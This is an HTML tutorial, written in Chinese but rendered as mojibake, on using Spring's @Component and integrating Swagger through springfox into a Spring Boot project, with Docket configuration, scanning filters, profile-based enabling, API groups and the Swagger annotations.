<p>4ã€@component ï¼ˆæŠŠæ™®é€špojoå®ä¾‹åŒ–åˆ°springå®¹å™¨ä¸­ï¼Œç›¸å½“äºé…ç½®æ–‡ä»¶ä¸­çš„<br><code>&lt;bean id=&quot;&quot; class=&quot;&quot;/&gt;</code>ï¼‰</p>
<ul>
<li>æ³›æŒ‡å„ç§ç»„ä»¶ï¼Œå°±æ˜¯è¯´å½“æˆ‘ä»¬çš„ç±»ä¸å±äºå„ç§å½’ç±»çš„æ—¶å€™ï¼ˆä¸å±äº@Controllerã€@Servicesç­‰çš„æ—¶å€™ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨@Componentæ¥æ ‡æ³¨è¿™ä¸ªç±»ã€‚</li>
</ul>
<p>æ¡ˆä¾‹ï¼š<br><code>&lt;context:component-scan base-package=â€com.*â€&gt;</code><br>ä¸Šé¢çš„è¿™ä¸ªä¾‹å­æ˜¯å¼•å…¥Componentç»„ä»¶çš„ä¾‹å­ï¼Œå…¶ä¸­base-packageè¡¨ç¤ºä¸ºéœ€è¦æ‰«æçš„æ‰€æœ‰å­åŒ…ã€‚<br>å…±åŒç‚¹ï¼šè¢«@controller ã€@serviceã€@repository ã€@component æ³¨è§£çš„ç±»ï¼Œéƒ½ä¼šæŠŠè¿™äº›ç±»çº³å…¥è¿›springå®¹å™¨ä¸­è¿›è¡Œç®¡ç†</p>
<h1 id="Springbooté›†æˆSwagger"><a href="#Springbooté›†æˆSwagger" class="headerlink" title="Springbooté›†æˆSwagger"></a>Springbooté›†æˆSwagger</h1><h2 id="Swaggerç®€ä»‹"><a href="#Swaggerç®€ä»‹" class="headerlink" title="Swaggerç®€ä»‹"></a>Swaggerç®€ä»‹</h2><p><strong>å‰åç«¯åˆ†ç¦»</strong></p>
<ul>
<li>å‰ç«¯ -&gt; å‰ç«¯æ§åˆ¶å±‚ã€è§†å›¾å±‚<ul>
<li>ä¼ªé€ åç«¯æ•°æ®ï¼Œjsonã€‚ä¸éœ€è¦åç«¯ï¼Œå‰ç«¯å·¥ç¨‹ä¾æ—§èƒ½å¤Ÿè·‘èµ·æ¥</li>
</ul>
</li>
<li>åç«¯ -&gt; åç«¯æ§åˆ¶å±‚ã€æœåŠ¡å±‚ã€æ•°æ®è®¿é—®å±‚</li>
<li>å‰åç«¯é€šè¿‡APIè¿›è¡Œäº¤äº’</li>
<li>å‰åç«¯ç›¸å¯¹ç‹¬ç«‹ä¸”æ¾è€¦åˆ</li>
<li>å‰åç«¯ç”šè‡³å¯ä»¥éƒ¨ç½²åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Š</li>
</ul>
<p><strong>äº§ç”Ÿçš„é—®é¢˜</strong></p>
<ul>
<li>å‰åç«¯é›†æˆï¼Œå‰ç«¯æˆ–è€…åç«¯æ— æ³•åšåˆ°â€œåŠæ—¶åå•†ï¼Œå°½æ—©è§£å†³â€ï¼Œæœ€ç»ˆå¯¼è‡´é—®é¢˜é›†ä¸­çˆ†å‘</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong></p>
<ul>
<li>é¦–å…ˆå®šä¹‰schema [ è®¡åˆ’çš„æçº² ]ï¼Œå¹¶å®æ—¶è·Ÿè¸ªæœ€æ–°çš„APIï¼Œé™ä½é›†æˆé£é™©</li>
<li>æ—©äº›å¹´ï¼šæŒ‡å®šwordè®¡åˆ’æ–‡æ¡£ï¼›ç”¨git</li>
<li>å‰åç«¯åˆ†ç¦»ï¼š<ul>
<li>å‰ç«¯æµ‹è¯•åç«¯æ¥å£ï¼špostman</li>
<li>åç«¯æä¾›æ¥å£ï¼Œéœ€è¦å®æ—¶æ›´æ–°æœ€æ–°çš„æ¶ˆæ¯åŠæ”¹åŠ¨ï¼</li>
</ul>
</li>
</ul>
<p><strong>Swagger</strong></p>
<ul>
<li>å·ç§°ä¸–ç•Œä¸Šæœ€æµè¡Œçš„APIæ¡†æ¶</li>
<li>Restful Api æ–‡æ¡£åœ¨çº¿è‡ªåŠ¨ç”Ÿæˆå™¨ &#x3D;&gt; <strong>API æ–‡æ¡£ ä¸API å®šä¹‰åŒæ­¥æ›´æ–°</strong></li>
<li>ç›´æ¥è¿è¡Œï¼Œåœ¨çº¿æµ‹è¯•API</li>
<li>æ”¯æŒå¤šç§è¯­è¨€ ï¼ˆå¦‚ï¼šJavaï¼ŒPHPç­‰ï¼‰</li>
<li>å®˜ç½‘ï¼š<a href="https://swagger.io/">https://swagger.io/</a></li>
</ul>
<p>åœ¨é¡¹ç›®ä½¿ç”¨swaggeréœ€è¦springbox</p>
<h2 id="SpringBooté›†æˆSwagger"><a href="#SpringBooté›†æˆSwagger" class="headerlink" title="SpringBooté›†æˆSwagger"></a>SpringBooté›†æˆSwagger</h2><p><strong>SpringBooté›†æˆSwagger</strong> &#x3D;&gt; <strong>springfox</strong>ï¼Œä¸¤ä¸ªjaråŒ…</p>
<ul>
<li>Springfox-swagger2</li>
<li>swagger-springmvc</li>
</ul>
<p><strong>ä½¿ç”¨Swagger</strong></p>
<p>è¦æ±‚ï¼šjdk 1.8 + å¦åˆ™swagger2æ— æ³•è¿è¡Œ</p>
<p>æ­¥éª¤ï¼š</p>
<p>1ã€æ–°å»ºä¸€ä¸ªSpringBoot-webé¡¹ç›®</p>
<p>2ã€æ·»åŠ Mavenä¾èµ–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger2 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;2.9.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger-ui --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;2.9.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>3ã€ç¼–å†™HelloControllerï¼Œæµ‹è¯•ç¡®ä¿è¿è¡ŒæˆåŠŸï¼</p>
<p>æ­¤æ—¶æœ‰ä¸¤ä¸ªè¯·æ±‚ï¼Œä¸€ä¸ªæ˜¯è¿”å›é»˜è®¤é”™è¯¯é¡µé¢ï¼Œä¸€ä¸ªæ˜¯helloè¯·æ±‚ã€‚</p>
<p>4ã€è¦ä½¿ç”¨Swaggerï¼Œæˆ‘ä»¬éœ€è¦ç¼–å†™ä¸€ä¸ªé…ç½®ç±»-SwaggerConfigæ¥é…ç½® Swagger</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Configuration //é…ç½®ç±»</span><br><span class="line">@EnableSwagger2// å¼€å¯Swagger2çš„è‡ªåŠ¨é…ç½®</span><br><span class="line">public class SwaggerConfig &#123;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5ã€è®¿é—®æµ‹è¯• ï¼š<a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a> ï¼Œå¯ä»¥çœ‹åˆ°swaggerçš„ç•Œé¢ï¼›</p>
<p><img src="/leyou.assets/640" alt="å›¾ç‰‡"></p>
<h2 id="é…ç½®Swagger"><a href="#é…ç½®Swagger" class="headerlink" title="é…ç½®Swagger"></a>é…ç½®Swagger</h2><p>1ã€Swaggerå®ä¾‹Beanæ˜¯Docketï¼Œæ‰€ä»¥é€šè¿‡é…ç½®Docketå®ä¾‹æ¥é…ç½®Swagggerã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span> <span class="comment">//é…ç½®docketä»¥é…ç½®Swaggerå…·ä½“å‚æ•°</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2ã€å¯ä»¥é€šè¿‡apiInfo()å±æ€§é…ç½®æ–‡æ¡£ä¿¡æ¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//é…ç½®æ–‡æ¡£ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">private</span> ApiInfo <span class="title function_">apiInfo</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">Contact</span> <span class="variable">contact</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Contact</span>(<span class="string">&quot;è”ç³»äººåå­—&quot;</span>, <span class="string">&quot;http://xxx.xxx.com/è”ç³»äººè®¿é—®é“¾æ¥&quot;</span>, <span class="string">&quot;è”ç³»äººé‚®ç®±&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApiInfo</span>(</span><br><span class="line">           <span class="string">&quot;Swaggerå­¦ä¹ &quot;</span>, <span class="comment">// æ ‡é¢˜</span></span><br><span class="line">           <span class="string">&quot;å­¦ä¹ æ¼”ç¤ºå¦‚ä½•é…ç½®Swagger&quot;</span>, <span class="comment">// æè¿°</span></span><br><span class="line">           <span class="string">&quot;v1.0&quot;</span>, <span class="comment">// ç‰ˆæœ¬</span></span><br><span class="line">           <span class="string">&quot;http://terms.service.url/ç»„ç»‡é“¾æ¥&quot;</span>, <span class="comment">// ç»„ç»‡é“¾æ¥</span></span><br><span class="line">           contact, <span class="comment">// è”ç³»äººä¿¡æ¯</span></span><br><span class="line">           <span class="string">&quot;Apach 2.0 è®¸å¯&quot;</span>, <span class="comment">// è®¸å¯</span></span><br><span class="line">           <span class="string">&quot;è®¸å¯é“¾æ¥&quot;</span>, <span class="comment">// è®¸å¯è¿æ¥</span></span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()<span class="comment">// æ‰©å±•</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3ã€Docket å®ä¾‹å…³è”ä¸Š apiInfo()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2).apiInfo(apiInfo());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4ã€é‡å¯é¡¹ç›®ï¼Œè®¿é—®æµ‹è¯• <a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a>  çœ‹ä¸‹æ•ˆæœï¼›</p>
<h2 id="é…ç½®æ‰«ææ¥å£"><a href="#é…ç½®æ‰«ææ¥å£" class="headerlink" title="é…ç½®æ‰«ææ¥å£"></a>é…ç½®æ‰«ææ¥å£</h2><p>1ã€æ„å»ºDocketæ—¶é€šè¿‡select()æ–¹æ³•é…ç½®æ€ä¹ˆæ‰«ææ¥å£ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">      .apiInfo(apiInfo())</span><br><span class="line">      .select()</span><br><span class="line">      <span class="comment">// é€šè¿‡.select()æ–¹æ³•ï¼Œå»é…ç½®æ‰«ææ¥å£,RequestHandlerSelectorsé…ç½®å¦‚ä½•æ‰«ææ¥å£</span></span><br><span class="line">      <span class="comment">// RequestHandlerselectors,é…ç½®è¦æ‰«ææ¥å£çš„æ–¹å¼</span></span><br><span class="line">      <span class="comment">// basepackageï¼šæŒ‡å®šè¦æ‰«æçš„åŒ…</span></span><br><span class="line">      <span class="comment">// any() :æ‰«æå…¨éƒ¨</span></span><br><span class="line">      <span class="comment">// none() : ä¸æ‰«æ</span></span><br><span class="line">      <span class="comment">// withclassAnnotationï¼šæ‰«æç±»ä¸Šçš„æ³¨è§£</span></span><br><span class="line">      <span class="comment">// withclassAnnotationï¼šæ‰«ææ–¹æ³•ä¸Šçš„æ³¨è§£</span></span><br><span class="line">      .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.kuang.swagger.controller&quot;</span>))</span><br><span class="line">      .build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2ã€é‡å¯é¡¹ç›®æµ‹è¯•ï¼Œç”±äºæˆ‘ä»¬é…ç½®æ ¹æ®åŒ…çš„è·¯å¾„æ‰«ææ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½çœ‹åˆ°ä¸€ä¸ªç±»</p>
<p>3ã€é™¤äº†é€šè¿‡åŒ…è·¯å¾„é…ç½®æ‰«ææ¥å£å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡é…ç½®å…¶ä»–æ–¹å¼æ‰«ææ¥å£ï¼Œè¿™é‡Œæ³¨é‡Šä¸€ä¸‹æ‰€æœ‰çš„é…ç½®æ–¹å¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">any() <span class="comment">// æ‰«ææ‰€æœ‰ï¼Œé¡¹ç›®ä¸­çš„æ‰€æœ‰æ¥å£éƒ½ä¼šè¢«æ‰«æåˆ°</span></span><br><span class="line">none() <span class="comment">// ä¸æ‰«ææ¥å£</span></span><br><span class="line"><span class="comment">// é€šè¿‡æ–¹æ³•ä¸Šçš„æ³¨è§£æ‰«æï¼Œå¦‚withMethodAnnotation(GetMapping.class)åªæ‰«ægetè¯·æ±‚</span></span><br><span class="line">withMethodAnnotation(<span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; annotation)</span><br><span class="line"><span class="comment">// é€šè¿‡ç±»ä¸Šçš„æ³¨è§£æ‰«æï¼Œå¦‚.withClassAnnotation(Controller.class)åªæ‰«ææœ‰controlleræ³¨è§£çš„ç±»ä¸­çš„æ¥å£</span></span><br><span class="line">withClassAnnotation(<span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; annotation)</span><br><span class="line">basePackage(<span class="keyword">final</span> String basePackage) <span class="comment">// æ ¹æ®åŒ…è·¯å¾„æ‰«ææ¥å£</span></span><br></pre></td></tr></table></figure>

<p>4ã€é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é…ç½®æ¥å£æ‰«æè¿‡æ»¤ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">      .apiInfo(apiInfo())</span><br><span class="line">      .select()<span class="comment">// é€šè¿‡.select()æ–¹æ³•ï¼Œå»é…ç½®æ‰«ææ¥å£,RequestHandlerSelectorsé…ç½®å¦‚ä½•æ‰«ææ¥å£</span></span><br><span class="line">      .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.kuang.swagger.controller&quot;</span>))</span><br><span class="line">       <span class="comment">// é…ç½®å¦‚ä½•é€šè¿‡pathè¿‡æ»¤,å³è¿™é‡Œåªæ‰«æè¯·æ±‚ä»¥/kuangå¼€å¤´çš„æ¥å£</span></span><br><span class="line">      .paths(PathSelectors.ant(<span class="string">&quot;/kuang/**&quot;</span>))</span><br><span class="line">      .build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5ã€è¿™é‡Œçš„å¯é€‰å€¼è¿˜æœ‰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">any() <span class="comment">// ä»»ä½•è¯·æ±‚éƒ½æ‰«æ</span></span><br><span class="line">none() <span class="comment">// ä»»ä½•è¯·æ±‚éƒ½ä¸æ‰«æ</span></span><br><span class="line">regex(<span class="keyword">final</span> String pathRegex) <span class="comment">// é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼æ§åˆ¶</span></span><br><span class="line">ant(<span class="keyword">final</span> String antPattern) <span class="comment">// é€šè¿‡ant()æ§åˆ¶</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022651.png" alt="å›¾ç‰‡"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="é…ç½®Swaggerå¼€å…³"><a href="#é…ç½®Swaggerå¼€å…³" class="headerlink" title="é…ç½®Swaggerå¼€å…³"></a>é…ç½®Swaggerå¼€å…³</h2><p>1ã€é€šè¿‡enable()æ–¹æ³•é…ç½®æ˜¯å¦å¯ç”¨swaggerï¼Œå¦‚æœæ˜¯falseï¼Œswaggerå°†ä¸èƒ½åœ¨æµè§ˆå™¨ä¸­è®¿é—®äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">      .apiInfo(apiInfo())</span><br><span class="line">      .enable(<span class="literal">false</span>) <span class="comment">//é…ç½®æ˜¯å¦å¯ç”¨Swaggerï¼Œå¦‚æœæ˜¯falseï¼Œåœ¨æµè§ˆå™¨å°†æ— æ³•è®¿é—®</span></span><br><span class="line">      .select()<span class="comment">// é€šè¿‡.select()æ–¹æ³•ï¼Œå»é…ç½®æ‰«ææ¥å£,RequestHandlerSelectorsé…ç½®å¦‚ä½•æ‰«ææ¥å£</span></span><br><span class="line">      .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.kuang.swagger.controller&quot;</span>))</span><br><span class="line">       <span class="comment">// é…ç½®å¦‚ä½•é€šè¿‡pathè¿‡æ»¤,å³è¿™é‡Œåªæ‰«æè¯·æ±‚ä»¥/kuangå¼€å¤´çš„æ¥å£</span></span><br><span class="line">      .paths(PathSelectors.ant(<span class="string">&quot;/kuang/**&quot;</span>))</span><br><span class="line">      .build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2ã€å¦‚ä½•åŠ¨æ€é…ç½®å½“é¡¹ç›®å¤„äºtestã€devç¯å¢ƒæ—¶æ˜¾ç¤ºswaggerï¼Œå¤„äºprodæ—¶ä¸æ˜¾ç¤ºï¼Ÿ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">(Environment environment)</span> &#123;</span><br><span class="line">   <span class="comment">// è®¾ç½®è¦æ˜¾ç¤ºswaggerçš„ç¯å¢ƒ</span></span><br><span class="line">   <span class="type">Profiles</span> <span class="variable">of</span> <span class="operator">=</span> Profiles.of(<span class="string">&quot;dev&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">   <span class="comment">// åˆ¤æ–­å½“å‰æ˜¯å¦å¤„äºè¯¥ç¯å¢ƒ</span></span><br><span class="line">   <span class="comment">// é€šè¿‡ enable() æ¥æ”¶æ­¤å‚æ•°åˆ¤æ–­æ˜¯å¦è¦æ˜¾ç¤º</span></span><br><span class="line">   <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> environment.acceptsProfiles(of);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">      .apiInfo(apiInfo())</span><br><span class="line">      .enable(b) <span class="comment">//é…ç½®æ˜¯å¦å¯ç”¨Swaggerï¼Œå¦‚æœæ˜¯falseï¼Œåœ¨æµè§ˆå™¨å°†æ— æ³•è®¿é—®</span></span><br><span class="line">      .select()<span class="comment">// é€šè¿‡.select()æ–¹æ³•ï¼Œå»é…ç½®æ‰«ææ¥å£,RequestHandlerSelectorsé…ç½®å¦‚ä½•æ‰«ææ¥å£</span></span><br><span class="line">      .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.kuang.swagger.controller&quot;</span>))</span><br><span class="line">       <span class="comment">// é…ç½®å¦‚ä½•é€šè¿‡pathè¿‡æ»¤,å³è¿™é‡Œåªæ‰«æè¯·æ±‚ä»¥/kuangå¼€å¤´çš„æ¥å£</span></span><br><span class="line">      .paths(PathSelectors.ant(<span class="string">&quot;/kuang/**&quot;</span>))</span><br><span class="line">      .build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3ã€å¯ä»¥åœ¨é¡¹ç›®ä¸­å¢åŠ ä¸€ä¸ªdevçš„é…ç½®æ–‡ä»¶æŸ¥çœ‹æ•ˆæœï¼</p>
<p><img src="/leyou.assets/640-20201226160302755" alt="å›¾ç‰‡"></p>
<h2 id="é…ç½®APIåˆ†ç»„"><a href="#é…ç½®APIåˆ†ç»„" class="headerlink" title="é…ç½®APIåˆ†ç»„"></a>é…ç½®APIåˆ†ç»„</h2><p><img src="/leyou.assets/640-20201226160302754" alt="å›¾ç‰‡"></p>
<p>1ã€å¦‚æœæ²¡æœ‰é…ç½®åˆ†ç»„ï¼Œé»˜è®¤æ˜¯defaultã€‚é€šè¿‡groupName()æ–¹æ³•å³å¯é…ç½®åˆ†ç»„ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">(Environment environment)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2).apiInfo(apiInfo())</span><br><span class="line">      .groupName(<span class="string">&quot;hello&quot;</span>) <span class="comment">// é…ç½®åˆ†ç»„</span></span><br><span class="line">       <span class="comment">// çœç•¥é…ç½®....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2ã€é‡å¯é¡¹ç›®æŸ¥çœ‹åˆ†ç»„</p>
<p>3ã€å¦‚ä½•é…ç½®å¤šä¸ªåˆ†ç»„ï¼Ÿé…ç½®å¤šä¸ªåˆ†ç»„åªéœ€è¦é…ç½®å¤šä¸ªdocketå³å¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket1</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2).groupName(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket2</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2).groupName(<span class="string">&quot;group2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket3</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2).groupName(<span class="string">&quot;group3&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4ã€é‡å¯é¡¹ç›®æŸ¥çœ‹å³å¯</p>
<h2 id="å®ä½“é…ç½®"><a href="#å®ä½“é…ç½®" class="headerlink" title="å®ä½“é…ç½®"></a>å®ä½“é…ç½®</h2><p>1ã€æ–°å»ºä¸€ä¸ªå®ä½“ç±»</p>
<p>Apiåªæ˜¯ç»™æ³¨é‡Šè€Œå·²ï¼Œå¹¶æ²¡ä»€ä¹ˆç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiModel(&quot;ç”¨æˆ·å®ä½“&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="meta">@ApiModelProperty(&quot;ç”¨æˆ·å&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String username;</span><br><span class="line">   <span class="meta">@ApiModelProperty(&quot;å¯†ç &quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2ã€åªè¦è¿™ä¸ªå®ä½“åœ¨<strong>è¯·æ±‚æ¥å£</strong>çš„è¿”å›å€¼ä¸Šï¼ˆå³ä½¿æ˜¯æ³›å‹ï¼‰ï¼Œéƒ½èƒ½æ˜ å°„åˆ°å®ä½“é¡¹ä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/getUser&quot;)</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">getUser</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3ã€é‡å¯æŸ¥çœ‹æµ‹è¯•</p>
<p><img src="/leyou.assets/640-20201226160302753" alt="å›¾ç‰‡"></p>
<p>æ³¨ï¼šå¹¶ä¸æ˜¯å› ä¸º@ApiModelè¿™ä¸ªæ³¨è§£è®©å®ä½“æ˜¾ç¤ºåœ¨è¿™é‡Œäº†ï¼Œè€Œæ˜¯åªè¦å‡ºç°åœ¨æ¥å£æ–¹æ³•çš„è¿”å›å€¼ä¸Šçš„å®ä½“éƒ½ä¼šæ˜¾ç¤ºåœ¨è¿™é‡Œï¼Œè€Œ@ApiModelå’Œ@ApiModelPropertyè¿™ä¸¤ä¸ªæ³¨è§£åªæ˜¯ä¸ºå®ä½“æ·»åŠ æ³¨é‡Šçš„ã€‚</p>
<p>@ApiModelä¸ºç±»æ·»åŠ æ³¨é‡Š</p>
<p>@ApiModelPropertyä¸ºç±»å±æ€§æ·»åŠ æ³¨é‡Š</p>
<h2 id="å¸¸ç”¨æ³¨è§£"><a href="#å¸¸ç”¨æ³¨è§£" class="headerlink" title="å¸¸ç”¨æ³¨è§£"></a>å¸¸ç”¨æ³¨è§£</h2><p>Swaggerçš„æ‰€æœ‰æ³¨è§£å®šä¹‰åœ¨io.swagger.annotationsåŒ…ä¸‹</p>
<p>ä¸‹é¢åˆ—ä¸€äº›ç»å¸¸ç”¨åˆ°çš„ï¼Œæœªåˆ—ä¸¾å‡ºæ¥çš„å¯ä»¥å¦è¡ŒæŸ¥é˜…è¯´æ˜ï¼š</p>
<table>
<thead>
<tr>
<th>Swaggeræ³¨è§£</th>
<th>ç®€å•è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>@Api(tags &#x3D; â€œxxxæ¨¡å—è¯´æ˜â€)</td>
<td>ä½œç”¨åœ¨æ¨¡å—ç±»ä¸Š</td>
</tr>
<tr>
<td>@ApiOperation(â€œxxxæ¥å£è¯´æ˜â€)</td>
<td>ä½œç”¨åœ¨æ¥å£æ–¹æ³•ä¸Š</td>
</tr>
<tr>
<td>@ApiModel(â€œxxxPOJOè¯´æ˜â€)</td>
<td>ä½œç”¨åœ¨æ¨¡å‹ç±»ä¸Šï¼šå¦‚VOã€BO</td>
</tr>
<tr>
<td>@ApiModelProperty(value &#x3D; â€œxxxå±æ€§è¯´æ˜â€,hidden &#x3D; true)</td>
<td>ä½œç”¨åœ¨ç±»æ–¹æ³•å’Œå±æ€§ä¸Šï¼Œhiddenè®¾ç½®ä¸ºtrueå¯ä»¥éšè—è¯¥å±æ€§</td>
</tr>
<tr>
<td>@ApiParam(â€œxxxå‚æ•°è¯´æ˜â€)</td>
<td>ä½œç”¨åœ¨å‚æ•°ã€æ–¹æ³•å’Œå­—æ®µä¸Šï¼Œç±»ä¼¼@ApiModelProperty</td>
</tr>
</tbody></table>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç»™è¯·æ±‚çš„æ¥å£é…ç½®ä¸€äº›æ³¨é‡Š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(&quot;ç‹‚ç¥çš„æ¥å£&quot;)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/kuang&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">kuang</span><span class="params">(<span class="meta">@ApiParam(&quot;è¿™ä¸ªåå­—ä¼šè¢«è¿”å›&quot;)</span>String username)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> username;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯ï¼Œå¯ä»¥ç»™ä¸€äº›æ¯”è¾ƒéš¾ç†è§£çš„å±æ€§æˆ–è€…æ¥å£ï¼Œå¢åŠ ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œè®©äººæ›´å®¹æ˜“é˜…è¯»ï¼</p>
